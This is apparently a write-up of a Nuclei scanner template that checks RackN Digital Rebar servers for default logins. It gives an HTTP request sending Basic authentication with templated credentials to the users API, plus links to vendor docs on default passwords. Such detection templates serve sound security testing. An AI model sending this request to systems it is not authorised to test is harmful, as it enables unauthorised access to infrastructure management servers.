# Nuclei Template: RackN Digital Rebar Default Login
**Template ID:** digitalrebar-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`digitalrebar-default-login.yaml`)

## Vulnerability Information & PoC

## Description
A RackN Digital Rebar default login was discovered.

## Steps to reproduce / Exploit Payload
```http
GET /api/v3/users HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

## References
- https://docs.rackn.io/en/latest/doc/faq-troubleshooting.html?#what-are-the-default-passwords
- https://rackn.com/
